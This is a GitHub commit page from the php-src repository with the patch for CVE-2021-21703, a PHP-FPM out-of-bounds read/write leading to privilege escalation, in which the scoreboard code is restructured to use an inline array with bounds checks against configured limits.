[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ff47798e685e5c97ba52fe7c9bf408a5b92ab5b6a)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ff47798e685e5c97ba52fe7c9bf408a5b92ab5b6a)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  563](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

## Commit

[Permalink](/php/php-src/commit/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix bug #81026 (PHP-FPM oob R/W in root process leading to priv escal…

[Browse files](/php/php-src/tree/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a)
Browse the repository at this point in the history

```
…ation)

The main change is to store scoreboard procs directly to the variable sized
array rather than indirectly through the pointer.

Signed-off-by: Stanislav Malyshev <stas@php.net>
(cherry picked from commit [cb2021e](https://github.com/php/php-src/commit/cb2021e5f69da5e2868130a05bb53db0f9f89e4b))

Closes [GH-7614](https://github.com/php/php-src/pull/7614).
```

* Loading branch information

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=40&v=4)](/bukka) [![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&v=4)](/cmb69)

[bukka](/php/php-src/commits?author=bukka "View all commits by bukka")
authored and
[cmb69](/php/php-src/commits?author=cmb69 "View all commits by cmb69")
committed
Oct 26, 2021

1 parent
[32c0850](/php/php-src/commit/32c0850b4ad6ddcf4eafcfce40735225f689ac5a)

commit f47798e

 Show file tree

 Hide file tree

Showing
**7 changed files**
with
**88 additions**
and
**61 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* NEWS
  [NEWS](#diff-7ee66c4f1536ac84dc5bbff1b8312e2eef24b974b3e48a5c5c2bcfdf2eb8f3ce)
* sapi/fpm/fpm

  + sapi/fpm/fpm/fpm\_children.c
    [fpm\_children.c](#diff-bc9e3a640014947c1b61c24965278aed577c94f2bdb7239ab7ac360ab8c4ce36)
  + sapi/fpm/fpm/fpm\_request.c
    [fpm\_request.c](#diff-7ca8f731ee921683e85b271ab731ae02f4cdc05b2cec6630ffa423b398c3e770)
  + sapi/fpm/fpm/fpm\_scoreboard.c
    [fpm\_scoreboard.c](#diff-5c4b3234616dbadda2d47a6c9dc035b7f96873bd2b324e61ace2713ae6ddace2)
  + sapi/fpm/fpm/fpm\_scoreboard.h
    [fpm\_scoreboard.h](#diff-6973e7a71e7238efe84f48f3db2c0f9d2d602b9822e89fab5a835ac3d34acf23)
  + sapi/fpm/fpm/fpm\_status.c
    [fpm\_status.c](#diff-838af21e79da4e7bd0e5c8a70aff09feda8066550d75c8fb1a6e9db674e431b5)
  + sapi/fpm/fpm/fpm\_worker\_pool.c
    [fpm\_worker\_pool.c](#diff-3ed2a6a89d2e60c82de36155bb1e27aba222471c5721a0c0c4322b88ee08ac42)

## There are no files selected for viewing

8 changes: 7 additions & 1 deletion

8
[NEWS](#diff-7ee66c4f1536ac84dc5bbff1b8312e2eef24b974b3e48a5c5c2bcfdf2eb8f3ce "NEWS")

Show comments

[View file](/php/php-src/blob/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a/NEWS)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,8 +1,14 @@ |
|  |  | PHP NEWS |
|  |  | ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| |
|  |  | ?? ??? ????, PHP 7.3.32 |
|  |  | ?? ??? ????, PHP 7.3.33 |
|  |  |  |
|  |  |  |
|  |  | 28 Okt 2021, PHP 7.3.32 |
| This comment has been minimized. [Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ff47798e685e5c97ba52fe7c9bf408a5b92ab5b6a)       Sorry, something went wrong.           Copy link    Quote reply     @thg2k **[thg2k](/thg2k)** [Oct 27, 2021](#r58803838) Contributor   Okt - Oct      All reactions          This comment has been minimized. [Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ff47798e685e5c97ba52fe7c9bf408a5b92ab5b6a)       Sorry, something went wrong.           Copy link    Quote reply     @cmb69 **[cmb69](/cmb69)** [Oct 27, 2021](#r58804503) Member   Already fixed as [ea16d7b](https://github.com/php/php-src/commit/ea16d7bd16acec9d3da10967c94a1acd22b25b6a).      All reactions | | |
|  |  |  |
|  |  | - FPM: |
|  |  | . Fixed bug #81026 (PHP-FPM oob R/W in root process leading to privilege |
|  |  | escalation). (CVE-2021-21703) (Jakub Zelenka) |
|  |  |  |
|  |  | 23 Sep 2021, PHP 7.3.31 |
|  |  |  |
|  |  | - Zip: |
| Expand Down | |  |

14 changes: 7 additions & 7 deletions

14
[sapi/fpm/fpm/fpm\_children.c](#diff-bc9e3a640014947c1b61c24965278aed577c94f2bdb7239ab7ac360ab8c4ce36 "sapi/fpm/fpm/fpm_children.c")

Show comments

[View file](/php/php-src/blob/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a/sapi/fpm/fpm/fpm_children.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -246,7 +246,7 @@ void fpm\_children\_bury() /\* {{{ \*/ |
|  |  |  |
|  |  | fpm\_child\_unlink(child); |
|  |  |  |
|  |  | fpm\_scoreboard\_proc\_free(wp->scoreboard, child->scoreboard\_i); |
|  |  | fpm\_scoreboard\_proc\_free(child); |
|  |  |  |
|  |  | fpm\_clock\_get(&tv1); |
|  |  |  |
| Expand All | | @@ -256,9 +256,9 @@ void fpm\_children\_bury() /\* {{{ \*/ |
|  |  | if (!fpm\_pctl\_can\_spawn\_children()) { |
|  |  | severity = ZLOG\_DEBUG; |
|  |  | } |
|  |  | zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", child->wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | } else { |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", child->wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | } |
|  |  |  |
|  |  | fpm\_child\_close(child, 1 /\* in event\_loop \*/); |
| Expand Down  Expand Up | | @@ -324,7 +324,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) / |
|  |  | return 0; |
|  |  | } |
|  |  |  |
|  |  | if (0 > fpm\_scoreboard\_proc\_alloc(wp->scoreboard, &c->scoreboard\_i)) { |
|  |  | if (0 > fpm\_scoreboard\_proc\_alloc(c)) { |
|  |  | fpm\_stdio\_discard\_pipes(c); |
|  |  | fpm\_child\_free(c); |
|  |  | return 0; |
| Expand All | | @@ -336,7 +336,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) / |
|  |  |  |
|  |  | static void fpm\_resources\_discard(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | { |
|  |  | fpm\_scoreboard\_proc\_free(child->wp->scoreboard, child->scoreboard\_i); |
|  |  | fpm\_scoreboard\_proc\_free(child); |
|  |  | fpm\_stdio\_discard\_pipes(child); |
|  |  | fpm\_child\_free(child); |
|  |  | } |
| Expand All | | @@ -349,10 +349,10 @@ static void fpm\_child\_resources\_use(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | if (wp == child->wp) { |
|  |  | continue; |
|  |  | } |
|  |  | fpm\_scoreboard\_free(wp->scoreboard); |
|  |  | fpm\_scoreboard\_free(wp); |
|  |  | } |
|  |  |  |
|  |  | fpm\_scoreboard\_child\_use(child->wp->scoreboard, child->scoreboard\_i, getpid()); |
|  |  | fpm\_scoreboard\_child\_use(child, getpid()); |
|  |  | fpm\_stdio\_child\_use\_pipes(child); |
|  |  | fpm\_child\_free(child); |
|  |  | } |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[sapi/fpm/fpm/fpm\_request.c](#diff-7ca8f731ee921683e85b271ab731ae02f4cdc05b2cec6630ffa423b398c3e770 "sapi/fpm/fpm/fpm_request.c")

Show comments

[View file](/php/php-src/blob/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a/sapi/fpm/fpm/fpm_request.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -287,7 +287,7 @@ int fpm\_request\_is\_idle(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | struct fpm\_scoreboard\_proc\_s \*proc; |
|  |  |  |
|  |  | /\* no need in atomicity here \*/ |
|  |  | proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  |  | proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  |  | if (!proc) { |
|  |  | return 0; |
|  |  | } |
| Expand All | | @@ -302,7 +302,7 @@ int fpm\_request\_last\_activity(struct fpm\_child\_s \*child, struct timeval \*tv) /\* |
|  |  |  |
|  |  | if (!tv) return -1; |
|  |  |  |
|  |  | proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  |  | proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  |  | if (!proc) { |
|  |  | return -1; |
|  |  | } |
| Expand Down | |  |

106 changes: 63 additions & 43 deletions

106
[sapi/fpm/fpm/fpm\_scoreboard.c](#diff-5c4b3234616dbadda2d47a6c9dc035b7f96873bd2b324e61ace2713ae6ddace2 "sapi/fpm/fpm/fpm_scoreboard.c")

Show comments

[View file](/php/php-src/blob/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a/sapi/fpm/fpm/fpm_scoreboard.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -6,6 +6,7 @@ |
|  |  | #include <time.h> |
|  |  |  |
|  |  | #include "fpm\_config.h" |
|  |  | #include "fpm\_children.h" |
|  |  | #include "fpm\_scoreboard.h" |
|  |  | #include "fpm\_shm.h" |
|  |  | #include "fpm\_sockets.h" |
| Expand All | | @@ -23,7 +24,6 @@ static float fpm\_scoreboard\_tick; |
|  |  | int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_worker\_pool\_s \*wp; |
|  |  | unsigned int i; |
|  |  |  |
|  |  | #ifdef HAVE\_TIMES |
|  |  | #if (defined(HAVE\_SYSCONF) && defined(\_SC\_CLK\_TCK)) |
| Expand All | | @@ -40,7 +40,7 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  |  |
|  |  |  |
|  |  | for (wp = fpm\_worker\_all\_pools; wp; wp = wp->next) { |
|  |  | size\_t scoreboard\_size, scoreboard\_nprocs\_size; |
|  |  | size\_t scoreboard\_procs\_size; |
|  |  | void \*shm\_mem; |
|  |  |  |
|  |  | if (wp->config->pm\_max\_children < 1) { |
| Expand All | | @@ -53,22 +53,15 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (wp->config->pm\_max\_children) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  |  | scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  | shm\_mem = fpm\_shm\_alloc(scoreboard\_size + scoreboard\_nprocs\_size); |
|  |  | scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  | shm\_mem = fpm\_shm\_alloc(sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size); |
|  |  |  |
|  |  | if (!shm\_mem) { |
|  |  | return -1; |
|  |  | } |
|  |  | wp->scoreboard = shm\_mem; |
|  |  | wp->scoreboard = shm\_mem; |
|  |  | wp->scoreboard->pm = wp->config->pm; |
|  |  | wp->scoreboard->nprocs = wp->config->pm\_max\_children; |
|  |  | shm\_mem += scoreboard\_size; |
|  |  |  |
|  |  | for (i = 0; i < wp->scoreboard->nprocs; i++, shm\_mem += sizeof(struct fpm\_scoreboard\_proc\_s)) { |
|  |  | wp->scoreboard->procs[i] = shm\_mem; |
|  |  | } |
|  |  |  |
|  |  | wp->scoreboard->pm = wp->config->pm; |
|  |  | wp->scoreboard->start\_epoch = time(NULL); |
|  |  | strlcpy(wp->scoreboard->pool, wp->config->name, sizeof(wp->scoreboard->pool)); |
|  |  | } |
| Expand Down  Expand Up | | @@ -162,28 +155,48 @@ struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get() /\* {{{\*/ |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/ |
|  |  | static inline struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_ex( |
|  |  | struct fpm\_scoreboard\_s \*scoreboard, int child\_index, unsigned int nprocs) /\* {{{\*/ |
|  |  | { |
|  |  | if (!scoreboard) { |
|  |  | scoreboard = fpm\_scoreboard; |
|  |  | return NULL; |
|  |  | } |
|  |  |  |
|  |  | if (!scoreboard) { |
|  |  | if (child\_index < 0 || (unsigned int)child\_index >= nprocs) { |
|  |  | return NULL; |
|  |  | } |
|  |  |  |
|  |  | return &scoreboard->procs[child\_index]; |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get( |
|  |  | struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/ |
|  |  | { |
|  |  | if (!scoreboard) { |
|  |  | scoreboard = fpm\_scoreboard; |
|  |  | } |
|  |  |  |
|  |  | if (child\_index < 0) { |
|  |  | child\_index = fpm\_scoreboard\_i; |
|  |  | } |
|  |  |  |
|  |  | if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) { |
|  |  | return NULL; |
|  |  | } |
|  |  | return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, scoreboard->nprocs); |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | return scoreboard->procs[child\_index]; |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child) /\* {{{\*/ |
|  |  | { |
|  |  | struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  |  | unsigned int nprocs = wp->config->pm\_max\_children; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  | int child\_index = child->scoreboard\_i; |
|  |  |  |
|  |  | return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, nprocs); |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  |  |
|  |  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang) /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_scoreboard\_s \*s; |
| Expand Down  Expand Up | | @@ -234,28 +247,28 @@ void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc) /\* {{{ \*/ |
|  |  | proc->lock = 0; |
|  |  | } |
|  |  |  |
|  |  | void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard) /\* {{{ \*/ |
|  |  | void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp) /\* {{{ \*/ |
|  |  | { |
|  |  | size\_t scoreboard\_size, scoreboard\_nprocs\_size; |
|  |  | size\_t scoreboard\_procs\_size; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  |  |
|  |  | if (!scoreboard) { |
|  |  | zlog(ZLOG\_ERROR, "\*\*scoreboard is NULL"); |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (scoreboard->nprocs) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  |  | scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* scoreboard->nprocs; |
|  |  | scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  |  |
|  |  | fpm\_shm\_free(scoreboard, scoreboard\_size + scoreboard\_nprocs\_size); |
|  |  | fpm\_shm\_free(scoreboard, sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size); |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid) /\* {{{ \*/ |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid) /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_scoreboard\_proc\_s \*proc; |
|  |  | fpm\_scoreboard = scoreboard; |
|  |  | fpm\_scoreboard\_i = child\_index; |
|  |  | proc = fpm\_scoreboard\_proc\_get(scoreboard, child\_index); |
|  |  | fpm\_scoreboard = child->wp->scoreboard; |
|  |  | fpm\_scoreboard\_i = child->scoreboard\_i; |
|  |  | proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  |  | if (!proc) { |
|  |  | return; |
|  |  | } |
| Expand All | | @@ -264,60 +277,67 @@ void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_ind |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{ \*/ |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  | int child\_index = child->scoreboard\_i; |
|  |  |  |
|  |  | if (!scoreboard) { |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) { |
|  |  | if (child\_index < 0 || child\_index >= wp->config->pm\_max\_children) { |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | if (scoreboard->procs[child\_index] && scoreboard->procs[child\_index]->used > 0) { |
|  |  | memset(scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s)); |
|  |  | if (scoreboard->procs[child\_index].used > 0) { |
|  |  | memset(&scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s)); |
|  |  | } |
|  |  |  |
|  |  | /\* set this slot as free to avoid search on next alloc \*/ |
|  |  | scoreboard->free\_proc = child\_index; |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index) /\* {{{ \*/ |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | { |
|  |  | int i = -1; |
|  |  | struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  | int nprocs = wp->config->pm\_max\_children; |
|  |  |  |
|  |  | if (!scoreboard || !child\_index) { |
|  |  | if (!scoreboard) { |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | /\* first try the slot which is supposed to be free \*/ |
|  |  | if (scoreboard->free\_proc >= 0 && (unsigned int)scoreboard->free\_proc < scoreboard->nprocs) { |
|  |  | if (scoreboard->procs[scoreboard->free\_proc] && !scoreboard->procs[scoreboard->free\_proc]->used) { |
|  |  | if (scoreboard->free\_proc >= 0 && scoreboard->free\_proc < nprocs) { |
|  |  | if (!scoreboard->procs[scoreboard->free\_proc].used) { |
|  |  | i = scoreboard->free\_proc; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if (i < 0) { /\* the supposed free slot is not, let's search for a free slot \*/ |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] the proc->free\_slot was not free. Let's search", scoreboard->pool); |
|  |  | for (i = 0; i < (int)scoreboard->nprocs; i++) { |
|  |  | if (scoreboard->procs[i] && !scoreboard->procs[i]->used) { /\* found \*/ |
|  |  | for (i = 0; i < nprocs; i++) { |
|  |  | if (!scoreboard->procs[i].used) { /\* found \*/ |
|  |  | break; |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /\* no free slot \*/ |
|  |  | if (i < 0 || i >= (int)scoreboard->nprocs) { |
|  |  | if (i < 0 || i >= nprocs) { |
|  |  | zlog(ZLOG\_ERROR, "[pool %s] no free scoreboard slot", scoreboard->pool); |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | scoreboard->procs[i]->used = 1; |
|  |  | \*child\_index = i; |
|  |  | scoreboard->procs[i].used = 1; |
|  |  | child->scoreboard\_i = i; |
|  |  |  |
|  |  | /\* supposed next slot is free \*/ |
|  |  | if (i + 1 >= (int)scoreboard->nprocs) { |
|  |  | if (i + 1 >= nprocs) { |
|  |  | scoreboard->free\_proc = 0; |
|  |  | } else { |
|  |  | scoreboard->free\_proc = i + 1; |
| Expand Down | |  |

11 changes: 6 additions & 5 deletions

11
[sapi/fpm/fpm/fpm\_scoreboard.h](#diff-6973e7a71e7238efe84f48f3db2c0f9d2d602b9822e89fab5a835ac3d34acf23 "sapi/fpm/fpm/fpm_scoreboard.h")

Show comments

[View file](/php/php-src/blob/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a/sapi/fpm/fpm/fpm_scoreboard.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -63,7 +63,7 @@ struct fpm\_scoreboard\_s { |
|  |  | unsigned int nprocs; |
|  |  | int free\_proc; |
|  |  | unsigned long int slow\_rq; |
|  |  | struct fpm\_scoreboard\_proc\_s \*procs[]; |
|  |  | struct fpm\_scoreboard\_proc\_s procs[]; |
|  |  | }; |
|  |  |  |
|  |  | int fpm\_scoreboard\_init\_main(); |
| Expand All | | @@ -72,18 +72,19 @@ int fpm\_scoreboard\_init\_child(struct fpm\_worker\_pool\_s \*wp); |
|  |  | void fpm\_scoreboard\_update(int idle, int active, int lq, int lq\_len, int requests, int max\_children\_reached, int slow\_rq, int action, struct fpm\_scoreboard\_s \*scoreboard); |
|  |  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get(); |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index); |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child); |
|  |  |  |
|  |  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang); |
|  |  | void fpm\_scoreboard\_release(struct fpm\_scoreboard\_s \*scoreboard); |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, int nohang); |
|  |  | void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc); |
|  |  |  |
|  |  | void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard); |
|  |  | void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp); |
|  |  |  |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid); |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid); |
|  |  |  |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index); |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index); |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child); |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child); |
|  |  |  |
|  |  | #ifdef HAVE\_TIMES |
